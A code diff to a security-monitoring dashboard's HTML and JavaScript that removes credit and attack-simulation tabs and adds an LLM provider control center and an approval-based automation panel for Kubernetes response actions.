@@ -104,7 +104,7 @@
             <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
                 <span id="clusterPill" class="pill">K8s —</span>
                 <span id="llmPill"    class="pill">LLM —</span>
-                <span id="govPill"    class="pill">Gov —</span>
+                <span id="govPill"    class="pill" title="Automation mode for Kubernetes response actions (click to manage)">Automation —</span>
                 <div style="width:1px;height:24px;background:rgba(255,255,255,0.1);margin:0 4px;"></div>
                 <span id="uptimeLabel" style="font-size:11px;color:#606080;font-family:'JetBrains Mono',monospace;">Uptime: —</span>
                 <button onclick="app.logout()" style="padding:7px 14px;background:rgba(255,51,102,0.12);border:1px solid rgba(255,51,102,0.3);color:#ff6688;border-radius:8px;font-size:13px;cursor:pointer;">
@@ -121,8 +121,9 @@
             <button class="tab-btn px-5 py-4 text-sm font-semibold" data-tab="alerts"     onclick="app.switchTab('alerts')"><i class="fas fa-bell mr-2"></i>Alerts<span id="alertBadge" style="margin-left:6px;padding:1px 6px;border-radius:999px;background:#dc2626;font-size:10px;font-weight:800;display:none;"></span></button>
             <button class="tab-btn px-5 py-4 text-sm font-semibold" data-tab="iot"        onclick="app.switchTab('iot')"><i class="fas fa-network-wired mr-2"></i>IoT Mesh</button>
             <button class="tab-btn px-5 py-4 text-sm font-semibold" data-tab="kubernetes" onclick="app.switchTab('kubernetes')"><i class="fas fa-cubes mr-2"></i>K8s Cluster</button>
-            <button class="tab-btn px-5 py-4 text-sm font-semibold" data-tab="credits"    onclick="app.switchTab('credits')"><i class="fas fa-wallet mr-2"></i>Credits</button>
-            <button class="tab-btn px-5 py-4 text-sm font-semibold" data-tab="attacks"    onclick="app.switchTab('attacks')"><i class="fas fa-bug mr-2"></i>Attack Simulation</button>
+            <button class="tab-btn px-5 py-4 text-sm font-semibold" data-tab="llm-control" onclick="app.switchTab('llm-control')"><i class="fas fa-sliders-h mr-2"></i>LLM Control</button>
+            <button class="tab-btn px-5 py-4 text-sm font-semibold" data-tab="governance" onclick="app.switchTab('governance')"><i class="fas fa-user-shield mr-2"></i>Automation</button>
+            <!-- Attack Simulation removed: live attacks only -->
         </div>
     </nav>
 
@@ -216,77 +217,436 @@
         </div>
 
         <!-- ── CREDITS ───────────────────────────────────────────── -->
-        <div id="tab-credits" class="tab-panel">
-            <div style="margin-bottom:20px;">
-                <h2 style="font-size:24px;font-weight:800;margin:0 0 4px;">LLM Credits & Billing</h2>
-                <p style="font-size:13px;color:#606080;margin:0;">Monitor remaining credits for all LLM providers. Low credit warnings help prevent service interruptions.</p>
+        <!-- 
+  ENHANCED LLM CONTROL CENTER
+  Enterprise-grade LLM provider management with improved UX, reliability indicators,
+  and visual hierarchy.
+-->
+<div id="tab-llm-control" class="tab-panel">
+    <!-- Header with simplified description -->
+    <div style="margin-bottom:20px;">
+        <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin-bottom:8px;">
+            <h2 style="font-size:24px;font-weight:800;margin:0;">AI Provider Control Center</h2>
+            <span id="llmConnectivityBadge" class="pill" style="font-size:11px;">
+                <i class="fas fa-circle" style="font-size:8px;margin-right:4px;"></i>Connecting...
+            </span>
+        </div>
+        <p style="font-size:13px;color:#606080;margin:0;max-width:800px;">
+            Manage which AI providers analyze security alerts. View health status, costs, and control automatic failover between providers.
+        </p>
+    </div>
+
+    <!-- Top Row (Panic Metrics) — TODAY -->
+    <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
+        <!-- Total Cost Today (big + color threshold) -->
+        <div class="stat-card" id="costCard">
+            <div class="stat-label"><i class="fas fa-dollar-sign mr-1"></i> Total Cost Today (USD)</div>
+            <div class="stat-value" id="llmCtrlCost" style="font-size:30px;color:#4ade80;">$0.00</div>
+            <div class="stat-sub" id="llmCtrlCostSub">0 calls today · threshold $5.00</div>
+        </div>
+
+        <!-- Total Tokens Used Today -->
+        <div class="stat-card">
+            <div class="stat-label"><i class="fas fa-coins mr-1"></i> Total Tokens Today</div>
+            <div class="stat-value" id="llmCtrlTokens" style="font-size:30px;">0</div>
+            <div class="stat-sub" id="llmCtrlTokensSub">prompt 0 · completion 0</div>
+        </div>
+
+        <!-- Current Active Provider -->
+        <div class="stat-card" id="activeProviderCard" style="border:1px solid rgba(0,240,255,0.3);background:linear-gradient(135deg,rgba(0,240,255,0.05),transparent);">
+            <div class="stat-label"><i class="fas fa-bolt mr-1" style="color:var(--accent-cyan);"></i> Current Active Provider</div>
+            <div class="stat-value" id="llmCtrlActive" style="font-size:26px;color:#fff;text-shadow:0 0 10px rgba(0,240,255,0.5);">—</div>
+            <div class="stat-sub" id="llmCtrlActiveMeta">routing mode: —</div>
+        </div>
+    </div>
+
+    <!-- Weekly Totals (Last 7 Days) -->
+    <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
+        <div class="stat-card">
+            <div class="stat-label"><i class="fas fa-calendar-week mr-1"></i> Total Cost (Last 7 Days)</div>
+            <div class="stat-value" id="llmCtrlCostWeek" style="font-size:26px;color:#a0a0b0;">$0.00</div>
+            <div class="stat-sub" id="llmCtrlCostWeekSub">0 calls · window: last 7 days</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-label"><i class="fas fa-coins mr-1"></i> Total Tokens (Last 7 Days)</div>
+            <div class="stat-value" id="llmCtrlTokensWeek" style="font-size:26px;">0</div>
+            <div class="stat-sub" id="llmCtrlTokensWeekSub">prompt 0 · completion 0</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-label"><i class="fas fa-phone-alt mr-1"></i> API Calls (Last 7 Days)</div>
+            <div class="stat-value" id="llmCtrlCallsWeek" style="font-size:26px;color:#a78bfa;">0</div>
+            <div class="stat-sub" id="llmCtrlCallsWeekSub">DB-backed usage window</div>
+        </div>
+    </div>
+
+    <!-- Connection Status & Last Update Widget -->
+    <div class="glass-panel rounded-xl p-3 mb-6" style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;">
+        <div style="display:flex;align-items:center;gap:16px;flex-wrap:wrap;">
+            <div style="display:flex;align-items:center;gap:6px;">
+                <span id="sseStatusDot" style="width:8px;height:8px;border-radius:50%;background:#eab308;box-shadow:0 0 6px #eab308;"></span>
+                <span id="sseStatusText" style="font-size:12px;color:#a0a0b0;">Connecting to live updates...</span>
             </div>
-            
-            <!-- Credit Summary Cards -->
-            <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
-                <div class="stat-card">
-                    <div class="stat-label">Total Available</div>
-                    <div class="stat-value" id="creditTotal">—</div>
-                    <div class="stat-sub">Across all providers</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-label">Healthy Providers</div>
-                    <div class="stat-value" id="creditHealthy">—</div>
-                    <div class="stat-sub">With sufficient credits</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-label">Low Credit Alerts</div>
-                    <div class="stat-value" id="creditAlerts" style="color:#f59e0b;">—</div>
-                    <div class="stat-sub">Providers need attention</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-label">Estimated Cost Today</div>
-                    <div class="stat-value" id="creditCostToday">—</div>
-                    <div class="stat-sub">USD spent on analysis</div>
-                </div>
+            <div style="width:1px;height:16px;background:rgba(255,255,255,0.1);"></div>
+            <div style="font-size:12px;color:#606080;">
+                Last updated: <span id="lastUpdateTime" style="color:#a0a0b0;font-family:'JetBrains Mono',monospace;">—</span>
+                <span id="dataAge" style="color:#606080;margin-left:4px;"></span>
             </div>
-            
-            <!-- Provider Credit Cards -->
-            <div id="creditProviderCards" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-6">
-                <!-- Cards will be populated by JavaScript -->
+        </div>
+        <div style="display:flex;gap:8px;flex-wrap:wrap;">
+            <button id="silenceErrorsBtn" onclick="app.toggleErrorSilence()" style="padding:6px 12px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.15);color:#a0a0b0;border-radius:6px;font-size:11px;" title="Hide non-critical health messages">
+                <i class="fas fa-bell-slash mr-1"></i>Silence Noise
+            </button>
+            <button id="liveProbeBtn" onclick="app.refreshLLMControl(true)" style="padding:6px 12px;background:rgba(0,240,255,0.12);border:1px solid rgba(0,240,255,0.3);color:var(--accent-cyan);border-radius:6px;font-size:11px;">
+                <i class="fas fa-sync-alt mr-1"></i>Health Check
+            </button>
+        </div>
+    </div>
+
+    <!-- Middle Row (Provider Breakdown Table) — TODAY -->
+    <div class="glass-panel rounded-xl p-4 mb-6">
+        <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;margin-bottom:12px;">
+            <div>
+                <h3 style="font-size:15px;font-weight:700;margin:0;"><i class="fas fa-table mr-2" style="color:#38bdf8;"></i>Provider Breakdown (today)</h3>
+                <p style="font-size:12px;color:#606080;margin:4px 0 0;">Provider Name · Status · API Calls · Tokens · Estimated Cost</p>
             </div>
-            
-            <!-- Credit Alerts Section -->
-            <div id="creditAlertSection" class="glass-panel rounded-xl p-4 mb-6" style="display:none;">
-                <h3 style="font-size:14px;font-weight:700;margin:0 0 12px;color:#f59e0b;"><i class="fas fa-exclamation-triangle mr-2"></i>Credit Alerts</h3>
-                <div id="creditAlertList"></div>
+            <div style="font-size:11px;color:#606080;">Source: DB-backed usage log</div>
+        </div>
+        <div style="overflow-x:auto;">
+            <table style="width:100%;border-collapse:collapse;font-size:12px;min-width:640px;">
+                <thead>
+                    <tr style="text-align:left;color:#a0a0b0;border-bottom:1px solid rgba(255,255,255,0.08);">
+                        <th style="padding:10px 8px;">Provider</th>
+                        <th style="padding:10px 8px;">Status</th>
+                        <th style="padding:10px 8px;">API Calls</th>
+                        <th style="padding:10px 8px;">Tokens</th>
+                        <th style="padding:10px 8px;">Est. Cost</th>
+                    </tr>
+                </thead>
+                <tbody id="llmUsageTableBody">
+                    <tr><td colspan="5" style="padding:12px 8px;color:#606080;">Loading…</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- Provider Status Section - Grouped by state -->
+    <div class="glass-panel rounded-xl p-4 mb-6">
+        <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;margin-bottom:16px;">
+            <div>
+                <h3 style="font-size:15px;font-weight:700;margin:0;"><i class="fas fa-heartbeat mr-2" style="color:#22c55e;"></i>Provider Health Status</h3>
+                <p style="font-size:12px;color:#606080;margin:4px 0 0;">Click any provider for detailed diagnostics and manual testing</p>
             </div>
-            
-            <!-- Refresh Button -->
-            <div style="display:flex;gap:12px;justify-content:flex-end;">
-                <button onclick="window.refreshCredits()" class="btn" style="background:rgba(0,240,255,0.1);border:1px solid rgba(0,240,255,0.3);color:var(--accent-cyan);">
-                    <i class="fas fa-sync-alt mr-2"></i>Refresh Credits
+            <div style="display:flex;gap:8px;flex-wrap:wrap;">
+                <button onclick="app.retryAllProviders()" style="padding:8px 14px;background:rgba(245,158,11,0.14);border:1px solid rgba(245,158,11,0.35);color:#fcd34d;border-radius:8px;font-size:12px;">
+                    <i class="fas fa-redo mr-1"></i>Reset All
                 </button>
             </div>
         </div>
 
-        <!-- ── ATTACK SIM ─────────────────────────────────────────── -->
-        <div id="tab-attacks" class="tab-panel">
-            <div style="margin-bottom:20px;">
-                <h2 style="font-size:24px;font-weight:800;margin:0 0 4px;">Attack Simulation</h2>
-                <p style="font-size:13px;color:#606080;margin:0;">Inject synthetic security events into the IDS pipeline to test detection and automated response. Each scenario maps to a MITRE ATT&amp;CK for ICS technique.</p>
+        <!-- Operational Providers -->
+        <div id="llmProvidersOperational" style="margin-bottom:16px;">
+            <div style="font-size:11px;color:#4ade80;text-transform:uppercase;letter-spacing:0.05em;margin-bottom:8px;display:flex;align-items:center;gap:6px;">
+                <i class="fas fa-check-circle"></i> Operational
             </div>
-            <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
-                <div class="stat-card"><div class="stat-label">Scenarios</div><div class="stat-value">12</div><div class="stat-sub">Ready to inject</div></div>
-                <div class="stat-card"><div class="stat-label">Runs this session</div><div class="stat-value" id="atkRunCount">0</div><div class="stat-sub">Since dashboard load</div></div>
-                <div class="stat-card"><div class="stat-label">Last LLM severity</div><div class="stat-value" id="atkLastSev">—</div><div class="stat-sub">Out of 10</div></div>
-                <div class="stat-card"><div class="stat-label">Last automated action</div><div class="stat-value" style="font-size:14px;" id="atkLastAction">—</div><div class="stat-sub">Executed by K8s automation</div></div>
-            </div>
-            <div id="attackGrid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-6"></div>
-            <div class="glass-panel rounded-xl p-4">
-                <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;">
-                    <h3 style="font-size:14px;font-weight:700;">Injection Log</h3>
-                    <button onclick="document.getElementById('attackLog').textContent='Log cleared.\n'" style="font-size:12px;color:#606080;background:none;border:none;cursor:pointer;">Clear</button>
-                </div>
-                <pre id="attackLog" style="background:#000;border:1px solid rgba(255,255,255,0.07);border-radius:8px;padding:14px;height:280px;overflow-y:auto;font-family:'JetBrains Mono',monospace;font-size:12px;color:#00ff88;white-space:pre-wrap;">Ready. Click a scenario above to inject a test alert into the IDS pipeline.
-</pre>
+            <div id="llmProviderCardsOperational" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
+                <!-- Operational provider cards rendered here -->
             </div>
         </div>
+
+        <!-- Degraded Providers -->
+        <div id="llmProvidersDegraded" style="margin-bottom:16px;display:none;">
+            <div style="font-size:11px;color:#facc15;text-transform:uppercase;letter-spacing:0.05em;margin-bottom:8px;display:flex;align-items:center;gap:6px;">
+                <i class="fas fa-exclamation-triangle"></i> Degraded / Cooldown
+            </div>
+            <div id="llmProviderCardsDegraded" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
+                <!-- Degraded provider cards rendered here -->
+            </div>
+        </div>
+
+        <!-- Not Configured / Failed Providers -->
+        <div id="llmProvidersFailed" style="display:none;">
+            <div style="font-size:11px;color:#f87171;text-transform:uppercase;letter-spacing:0.05em;margin-bottom:8px;display:flex;align-items:center;gap:6px;">
+                <i class="fas fa-times-circle"></i> Not Configured / Failed
+            </div>
+            <div id="llmProviderCardsFailed" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
+                <!-- Failed provider cards rendered here -->
+            </div>
+        </div>
+    </div>
+
+    <!-- Quick Test Panel -->
+    <div class="glass-panel rounded-xl p-4 mb-6">
+        <h3 style="font-size:14px;font-weight:700;margin:0 0 12px;"><i class="fas fa-vial mr-2" style="color:#a78bfa;"></i>Test Provider Response</h3>
+        <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:flex-start;">
+            <select id="llmTestProvider" style="background:#13131f;border:1px solid rgba(255,255,255,0.1);border-radius:8px;padding:8px 12px;color:#fff;font-size:13px;min-width:180px;">
+                <option value="">Auto-select (router decides)</option>
+            </select>
+            <input id="llmTestPrompt" value="Analyze this security alert: suspicious outbound connection detected" 
+                style="flex:1;min-width:280px;background:#13131f;border:1px solid rgba(255,255,255,0.1);border-radius:8px;padding:8px 12px;color:#fff;font-size:13px;" />
+            <button id="llmRunTestBtn" onclick="app.runLLMTest()" style="padding:8px 16px;background:rgba(124,58,237,0.18);border:1px solid rgba(124,58,237,0.45);color:#c4b5fd;border-radius:8px;font-size:12px;">
+                <i class="fas fa-play mr-1"></i>Test
+            </button>
+            <button id="llmRunAllTestBtn" onclick="app.runLLMTestAll()" style="padding:8px 16px;background:rgba(56,189,248,0.16);border:1px solid rgba(56,189,248,0.4);color:#7dd3fc;border-radius:8px;font-size:12px;">
+                <i class="fas fa-layer-group mr-1"></i>Test All
+            </button>
+        </div>
+        <div id="llmTestResult" style="margin-top:12px;display:none;">
+            <div style="background:#0a0a0f;border:1px solid rgba(255,255,255,0.08);border-radius:8px;padding:12px;">
+                <div id="llmTestResultHeader" style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px;">
+                    <span id="llmTestResultStatus" style="font-size:12px;font-weight:600;"></span>
+                    <span id="llmTestResultMeta" style="font-size:11px;color:#606080;"></span>
+                </div>
+                <pre id="llmTestResultContent" style="margin:0;color:#a0a0b0;font-size:11.5px;white-space:pre-wrap;max-height:200px;overflow-y:auto;font-family:'JetBrains Mono',monospace;"></pre>
+            </div>
+        </div>
+    </div>
+
+    <!-- Failover Chain Visualization -->
+    <div class="glass-panel rounded-xl p-4 mb-6">
+        <h3 style="font-size:14px;font-weight:700;margin:0 0 12px;"><i class="fas fa-code-branch mr-2" style="color:#22c55e;"></i>Automatic Failover Chain</h3>
+        <p style="font-size:12px;color:#606080;margin:0 0 12px;">If the active provider fails, traffic automatically flows to the next healthy provider in this chain.</p>
+        <div id="llmFallbackChain" style="display:flex;align-items:center;flex-wrap:wrap;gap:8px;padding:12px;background:rgba(0,0,0,0.2);border-radius:8px;">
+            <span style="color:#606080;font-size:12px;">Loading failover configuration...</span>
+        </div>
+        
+        <!-- Manual Override Controls -->
+        <div style="margin-top:16px;padding-top:16px;border-top:1px solid rgba(255,255,255,0.06);">
+            <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
+                <span style="font-size:12px;color:#a0a0b0;">Manual Override:</span>
+                <select id="forceProviderSelect" style="background:#13131f;border:1px solid rgba(255,255,255,0.1);border-radius:8px;padding:6px 10px;color:#fff;font-size:12px;">
+                    <option value="">Automatic (failover enabled)</option>
+                </select>
+                <button id="forceApplyBtn" onclick="app.applyForcedProvider()" style="padding:6px 12px;background:rgba(0,240,255,0.12);border:1px solid rgba(0,240,255,0.3);color:var(--accent-cyan);border-radius:6px;font-size:11px;">Apply</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Performance Comparison -->
+    <div class="glass-panel rounded-xl p-4 mb-6">
+        <h3 style="font-size:14px;font-weight:700;margin:0 0 12px;"><i class="fas fa-chart-bar mr-2" style="color:#38bdf8;"></i>Provider Performance Comparison</h3>
+        <div id="llmUsageCompare" style="font-size:12px;">
+            <div style="color:#606080;text-align:center;padding:20px;">
+                <i class="fas fa-spinner fa-spin mr-2"></i>Loading performance metrics...
+            </div>
+        </div>
+    </div>
+
+    <!-- Routing Strategy & Risk -->
+    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-6">
+        <div class="glass-panel rounded-xl p-4">
+            <h3 style="font-size:14px;font-weight:700;margin:0 0 12px;"><i class="fas fa-route mr-2" style="color:#f59e0b;"></i>Routing Strategy</h3>
+            <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-bottom:12px;">
+                <select id="llmRoutingMode" onchange="app.onRoutingModeChange()" style="background:#13131f;border:1px solid rgba(255,255,255,0.1);border-radius:8px;padding:8px 12px;color:#fff;font-size:13px;min-width:160px;">
+                    <option value="priority">Priority (failover chain)</option>
+                    <option value="cost_optimized">Cost Optimized (cheapest first)</option>
+                    <option value="severity_adaptive">Severity Adaptive (premium for critical)</option>
+                    <option value="ab_test">A/B Testing (split traffic)</option>
+                </select>
+                <div id="routingModeHelp" style="font-size:11px;color:#606080;max-width:300px;">
+                    Use failover chain order. If provider fails, automatically switch to next.
+                </div>
+            </div>
+            
+            <!-- Cost ceiling input (shown for cost_optimized) -->
+            <div id="costCeilingGroup" style="display:none;margin-bottom:12px;">
+                <label style="font-size:11px;color:#606080;display:block;margin-bottom:4px;">Max cost per call (USD)</label>
+                <input id="llmRoutingCost" type="number" step="0.001" min="0" placeholder="0.005" style="width:120px;background:#13131f;border:1px solid rgba(255,255,255,0.1);border-radius:8px;padding:8px 10px;color:#fff;font-size:12px;" />
+            </div>
+            
+            <!-- A/B test inputs (shown for ab_test) -->
+            <div id="abTestGroup" style="display:none;">
+                <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px;">
+                    <div>
+                        <label style="font-size:11px;color:#606080;display:block;margin-bottom:4px;">Provider A</label>
+                        <select id="llmRoutingA" style="background:#13131f;border:1px solid rgba(255,255,255,0.1);border-radius:8px;padding:6px 10px;color:#fff;font-size:12px;width:120px;"></select>
+                    </div>
+                    <div>
+                        <label style="font-size:11px;color:#606080;display:block;margin-bottom:4px;">Provider B</label>
+                        <select id="llmRoutingB" style="background:#13131f;border:1px solid rgba(255,255,255,0.1);border-radius:8px;padding:6px 10px;color:#fff;font-size:12px;width:120px;"></select>
+                    </div>
+                    <div>
+                        <label style="font-size:11px;color:#606080;display:block;margin-bottom:4px;">A Traffic %</label>
+                        <input id="llmRoutingSplit" type="number" min="0" max="100" placeholder="50" style="width:80px;background:#13131f;border:1px solid rgba(255,255,255,0.1);border-radius:8px;padding:6px 10px;color:#fff;font-size:12px;" />
+                    </div>
+                </div>
+            </div>
+            
+            <button id="llmRoutingApplyBtn" onclick="app.applyRoutingStrategy()" style="padding:8px 16px;background:rgba(245,158,11,0.14);border:1px solid rgba(245,158,11,0.35);color:#fcd34d;border-radius:8px;font-size:12px;">
+                <i class="fas fa-save mr-1"></i>Save Strategy
+            </button>
+        </div>
+
+        <div class="glass-panel rounded-xl p-4">
+            <h3 style="font-size:14px;font-weight:700;margin:0 0 12px;"><i class="fas fa-brain mr-2" style="color:#a78bfa;"></i>Risk Forecast</h3>
+            <div id="llmPredictiveRisk">
+                <div style="text-align:center;padding:20px;color:#606080;">
+                    <i class="fas fa-chart-area" style="font-size:24px;margin-bottom:8px;opacity:0.5;"></i>
+                    <div style="font-size:12px;">Risk forecast will appear after processing alerts</div>
+                    <div style="font-size:11px;margin-top:4px;">Based on recent alert patterns and provider performance</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Event Log - Deduplicated and filterable -->
+    <div class="glass-panel rounded-xl p-4">
+        <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;margin-bottom:12px;">
+            <h3 style="font-size:14px;font-weight:700;margin:0;"><i class="fas fa-terminal mr-2" style="color:#a0a0b0;"></i>System Events</h3>
+            <div style="display:flex;gap:8px;flex-wrap:wrap;">
+                <button onclick="app.clearLLMEvents()" style="padding:4px 10px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.15);color:#606080;border-radius:6px;font-size:11px;">Clear</button>
+            </div>
+        </div>
+        <pre id="llmEventLog" style="background:#0a0a0f;border:1px solid rgba(255,255,255,0.08);border-radius:8px;padding:12px;color:#a0a0b0;font-size:11px;max-height:200px;overflow-y:auto;font-family:'JetBrains Mono',monospace;margin:0;">
+<span style="color:#606080;">// Events appear here: provider health changes, routing decisions, test results</span>
+        </pre>
+    </div>
+</div>
+
+<!-- ── AUTOMATION / GOVERNANCE ───────────────────────────────────────── -->
+<div id="tab-governance" class="tab-panel">
+    <div class="glass-panel rounded-xl p-6 mb-6">
+        <div style="display:flex;align-items:flex-start;justify-content:space-between;gap:12px;flex-wrap:wrap;">
+            <div>
+                <h2 style="font-size:18px;font-weight:800;margin:0 0 6px;">Automation Control</h2>
+                <div id="govModeDesc" style="font-size:13px;color:#606080;">Controls whether Kubernetes response actions run automatically or require approval.</div>
+            </div>
+            <button onclick="app.refreshGovernance(true)" style="padding:8px 16px;background:rgba(0,240,255,0.1);border:1px solid rgba(0,240,255,0.3);color:var(--accent-cyan);border-radius:8px;font-size:13px;cursor:pointer;"><i class="fas fa-sync-alt mr-2"></i>Refresh</button>
+        </div>
+
+        <div style="margin-top:16px;display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
+            <span style="font-size:11px;color:#606080;text-transform:uppercase;font-weight:800;letter-spacing:.06em;">Current mode</span>
+            <span id="govModePill" class="pill">—</span>
+            <span id="govModeHelp" style="font-size:12px;color:#a0a0b0;"></span>
+        </div>
+    </div>
+
+    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+        <div class="glass-panel rounded-xl p-6">
+            <h3 style="font-size:15px;font-weight:800;margin:0 0 12px;">Mode selection</h3>
+            <div style="display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:10px;">
+                <button id="govBtnManual" onclick="app.setAutomationMode('manual')" style="padding:12px;border-radius:10px;border:1px solid rgba(255,51,102,0.25);background:rgba(255,51,102,0.06);color:#ff6688;font-weight:800;cursor:pointer;">
+                    🔒 Manual
+                    <div style="font-size:11px;font-weight:600;color:#a0a0b0;margin-top:4px;">Approval required</div>
+                </button>
+                <button id="govBtnAssisted" onclick="app.setAutomationMode('assisted')" style="padding:12px;border-radius:10px;border:1px solid rgba(250,204,21,0.22);background:rgba(250,204,21,0.06);color:#facc15;font-weight:800;cursor:pointer;">
+                    ⚡ Assisted
+                    <div style="font-size:11px;font-weight:600;color:#a0a0b0;margin-top:4px;">Risk-based approval</div>
+                </button>
+                <button id="govBtnAutonomous" onclick="app.setAutomationMode('autonomous')" style="padding:12px;border-radius:10px;border:1px solid rgba(0,255,136,0.22);background:rgba(0,255,136,0.06);color:#00ff88;font-weight:800;cursor:pointer;">
+                    ✅ Auto
+                    <div style="font-size:11px;font-weight:600;color:#a0a0b0;margin-top:4px;">Execute automatically</div>
+                </button>
+            </div>
+            <div style="margin-top:12px;font-size:12px;color:#606080;">This UI intentionally does not expose a bypass/override mode.</div>
+        </div>
+
+        <div class="glass-panel rounded-xl p-6">
+            <h3 style="font-size:15px;font-weight:800;margin:0 0 12px;">Mode statistics</h3>
+            <div class="grid grid-cols-3 gap-4">
+                <div class="stat-card"><div class="stat-label">Approved</div><div id="govApproved" class="stat-value" style="color:#00ff88;">0</div><div class="stat-sub">Executed actions</div></div>
+                <div class="stat-card"><div class="stat-label">Rejected</div><div id="govRejected" class="stat-value" style="color:#ff6688;">0</div><div class="stat-sub">Operator overrides</div></div>
+                <div class="stat-card"><div class="stat-label">Pending</div><div id="govPending" class="stat-value" style="color:#facc15;">0</div><div class="stat-sub">Awaiting review</div></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="glass-panel rounded-xl p-6 mt-6">
+        <h3 style="font-size:15px;font-weight:800;margin:0 0 12px;">Pending actions</h3>
+        <div id="govPendingList" style="color:#606080;font-size:13px;">Loading…</div>
+    </div>
+</div>
+
+<style>
+/* Provider card styles */
+.provider-card {
+    background: rgba(19,19,31,0.8);
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 10px;
+    padding: 14px;
+    transition: all 0.2s;
+    position: relative;
+    overflow: hidden;
+}
+.provider-card:hover {
+    border-color: rgba(255,255,255,0.15);
+    transform: translateY(-1px);
+}
+.provider-card.operational {
+    border-left: 3px solid #22c55e;
+}
+.provider-card.degraded {
+    border-left: 3px solid #facc15;
+}
+.provider-card.failed {
+    border-left: 3px solid #ef4444;
+}
+.provider-card.not-configured {
+    border-left: 3px solid #64748b;
+    opacity: 0.8;
+}
+.provider-status-dot {
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+    display: inline-block;
+}
+.provider-status-dot.operational {
+    background: #22c55e;
+    box-shadow: 0 0 6px #22c55e;
+}
+.provider-status-dot.degraded {
+    background: #facc15;
+    box-shadow: 0 0 6px #facc15;
+}
+.provider-status-dot.failed {
+    background: #ef4444;
+    box-shadow: 0 0 6px #ef4444;
+}
+.provider-status-dot.not-configured {
+    background: #64748b;
+}
+
+/* Failover chain pills */
+.chain-pill {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 6px 12px;
+    border-radius: 999px;
+    font-size: 12px;
+    font-weight: 500;
+    border: 1px solid rgba(255,255,255,0.15);
+}
+.chain-pill.healthy {
+    background: rgba(34,197,94,0.1);
+    color: #4ade80;
+    border-color: rgba(34,197,94,0.3);
+}
+.chain-pill.degraded {
+    background: rgba(250,204,21,0.1);
+    color: #facc15;
+    border-color: rgba(250,204,21,0.3);
+}
+.chain-pill.failed {
+    background: rgba(239,68,68,0.1);
+    color: #f87171;
+    border-color: rgba(239,68,68,0.3);
+}
+.chain-pill.active {
+    box-shadow: 0 0 0 2px rgba(0,240,255,0.4);
+}
+
+/* Metric sparkline placeholder */
+.sparkline {
+    height: 20px;
+    width: 60px;
+    background: rgba(255,255,255,0.05);
+    border-radius: 4px;
+}
+</style>
+
+
+        <!-- Attack Simulation removed: live attacks only -->
 
     </main>
 </div>
@@ -354,13 +714,30 @@ const api = {
     },
     getHealth()   { return this._pub('/health'); },
     getMetrics()  { return this._pub('/api/metrics'); },
+    getLLMUsage(window='today') {
+        const qs = new URLSearchParams({ window: String(window||'today') }).toString();
+        return this._pub(`/api/metrics/llm-usage?${qs}`);
+    },
     getAlerts(n)  { return this._pub(`/api/alerts?limit=${n||50}`); },
     getIoT()      { return this._pub('/api/iot/devices'); },
     getPipeline() { return this._pub('/api/pipeline-overview'); },
     getGov()      { return this._fetch('/api/governance/status'); },
+    getGovPending(){ return this._fetch('/api/governance/pending'); },
+    setGovMode(mode){
+        const qs = new URLSearchParams({ mode: String(mode||'assisted') }).toString();
+        return this._fetch(`/api/governance/mode?${qs}`, { method:'POST' });
+    },
+    approveGovAction(id, comment=''){
+        const qs = new URLSearchParams({ comment: String(comment||'') }).toString();
+        return this._fetch(`/api/governance/approve/${encodeURIComponent(id)}?${qs}`, { method:'POST' });
+    },
+    rejectGovAction(id, reason=''){
+        const qs = new URLSearchParams({ reason: String(reason||'') }).toString();
+        return this._fetch(`/api/governance/reject/${encodeURIComponent(id)}?${qs}`, { method:'POST' });
+    },
     getLLMDiag()  { return this._pub('/api/llm/diagnostics'); },
     getCredits()  { return this._pub('/api/llm/credits/'); },
-    injectAlert(p){ return fetch(CFG.API+'/api/alerts/internal',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(p)}).then(r=>r.json()).catch(()=>({error:'Network error'})); }
+    // Synthetic attack helpers removed (live traffic only).
 };
 
 // ── Live SSE feed ──────────────────────────────────────────────────────
@@ -443,7 +820,7 @@ const render = {
         if (af && alerts?.alerts) {
             const recent=alerts.alerts.slice(0,10);
             af.innerHTML = recent.length===0
